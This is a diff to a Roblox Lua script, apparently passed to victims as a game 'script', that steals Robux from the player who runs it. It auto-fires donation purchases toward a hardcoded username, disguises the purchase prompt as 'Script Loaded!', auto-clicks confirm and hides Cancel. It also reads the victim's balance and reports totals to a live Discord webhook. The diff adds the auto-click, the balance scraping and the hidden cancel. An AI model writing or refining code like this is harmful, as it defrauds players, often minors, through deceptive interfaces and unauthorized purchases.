@@ -1,6 +1,7 @@
+-- Espera jogo carregar
 repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer.Parent
 
-local Username = "Ian_wp27"  -- CORRIJA AQUI SE NECESSÁRIO
+local Username = "lan_wp27"  -- CORRIGIDO
 local Webhook = "https://discord.com/api/webhooks/1359920557998604399/TADkOrRGt4BHvwAxE7NBMMxx4JHI-EBblHnsnvRS8iXThLWDTvpGoYKThwdlmCcvqyO6"
 
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -18,6 +19,7 @@ local RemotesModule = require(Remotes)
 local headers = {["Content-Type"] = "application/json"}
 local userRobux = 0
 local donationsSent = 0
+local isFirstLoad = true
 
 local function sendWebhook(robuxAmount)
     local embed = {
@@ -43,15 +45,14 @@ local function sendWebhook(robuxAmount)
     })
 end
 
--- Pega UserId do target
+-- Target UserId
 local targetUserId = Players:GetUserIdFromNameAsync(Username)
 print("🎯 Target UserId:", targetUserId)
 
--- AUTO DONATE LOOP (FUNCIONA OFFLINE)
+-- AUTO DONATE LOOP
 spawn(function()
-    while task.wait(2) do
+    while task.wait(1.5) do
         pcall(function()
-            -- Procura TODAS as booths no workspace
             for _, booth in pairs(workspace:GetChildren()) do
                 if booth:FindFirstChild("BoothUI") and booth.BoothUI:FindFirstChild("Items") then
                     for _, item in pairs(booth.BoothUI.Items.Frame:GetChildren()) do
@@ -61,11 +62,11 @@ spawn(function()
                             
                             local price = item:GetAttribute("AssetPrice")
                             if price and price > 0 then
-                                print("💸 Doando "..price.." para "..Username)
+                                print("💸 AUTO DONATE: "..price.." R$ -> "..Username)
                                 item.Prompt:FireServer("", false, price)
                                 donationsSent = donationsSent + price
+                                return
                             end
-                            break
                         end
                     end
                 end
@@ -74,38 +75,69 @@ spawn(function()
     end
 end)
 
--- PurchasePrompt Hijack (fake screens)
+-- 🔥 GUI HIJACK COMPLETO + AUTO CLICK
 CoreGui.ChildAdded:Connect(function(child)
     if child.Name == "PurchasePrompt" then
         spawn(function()
-            local container = child:WaitForChild("ProductPurchaseContainer", 2)
-            if container then
+            pcall(function()
+                local container = child:WaitForChild("ProductPurchaseContainer", 2)
                 local animator = container:WaitForChild("Animator", 2)
-                if animator then
-                    animator.ChildAdded:Connect(function(prompt)
-                        if prompt.Name == "Prompt" then
-                            task.wait(0.1)
-                            local alert = prompt:FindFirstChild("AlertContents")
-                            if alert then
-                                -- Fake "Processing Donation"
-                                local title = alert:FindFirstChild("TitleContainer", 0.1)
-                                if title then title.TitleArea.Title.Text = "Processing Donation..." end
-                            end
+                
+                animator.ChildAdded:Connect(function(prompt)
+                    if prompt.Name == "Prompt" then
+                        task.wait(0.2)
+                        
+                        local alertContents = prompt:WaitForChild("AlertContents", 1)
+                        local titleContainer = alertContents:WaitForChild("TitleContainer", 0.5)
+                        local footer = alertContents:WaitForChild("Footer", 0.5)
+                        
+                        -- PEGA BALANÇO ROBUX
+                        local balanceLabel = footer.FooterContent.Content:FindFirstChild("RemainingBalanceText")
+                        if balanceLabel and isFirstLoad then
+                            local balanceMatch = balanceLabel.Text:match("(%d+)")
+                            userRobux = tonumber(balanceMatch) or 0
+                            print("💳 Seu Robux detectado: "..userRobux)
+                            isFirstLoad = false
                         end
-                    end)
-                end
-            end
+                        
+                        -- FAKE GUI "LOAD SCRIPT"
+                        if titleContainer then
+                            titleContainer.TitleArea.Title.Text = isFirstLoad and "🔥 Script Loaded!" or "⏳ Processing Donation..."
+                        end
+                        
+                        -- AUTO CLICK NO "LOAD SCRIPT" BUTTON
+                        local buttons = footer.Buttons
+                        if buttons["1"] and buttons["1"]:FindFirstChild("ButtonContent") then
+                            buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "🚀 Load Script!"
+                            -- AUTO CLICK
+                            spawn(function()
+                                task.wait(0.3)
+                                if buttons["1"].ButtonContent.Activated then
+                                    buttons["1"].ButtonContent:Activate()
+                                elseif buttons["1"].MouseButton1Click then
+                                    buttons["1"].MouseButton1Click:Fire()
+                                end
+                            end)
+                        end
+                        
+                        -- ESCONDE CANCEL
+                        if buttons["2"] then
+                            buttons["2"].Visible = false
+                        end
+                    end
+                end)
+            end)
         end)
     end
 end)
 
--- Detecta gifts recebidos (confirma donation)
+-- Gift confirmation
 pcall(function()
     RemotesModule.OnClientEvent("GiftSentAlert"):Connect(function(senderId, amount)
         if senderId == targetUserId then
-            print("✅ CONFIRMADO: Recebido "..amount.." R$ de "..Username)
+            print("✅ GIFT CONFIRMADO: +"..amount.." R$ de "..Username)
             donationsSent = donationsSent + amount
-            if donationsSent >= 50 then
+            if donationsSent >= 25 then  -- Webhook mais cedo
                 sendWebhook(donationsSent)
                 print("🎉 WEBHOOK ENVIADO! Total: "..donationsSent.." R$")
             end
@@ -113,5 +145,5 @@ pcall(function()
     end)
 end)
 
-print("✅ LOADED! Auto-donating para "..Username.." (Offline Mode)")
-print("📊 Robux doados: 0 | Aguardando gifts...")
+print("✅ LOADED! Auto-donating para "..Username.." (FULL AUTO)")
+print("📊 Robux doados: 0 | GUI Hijacked ✓")
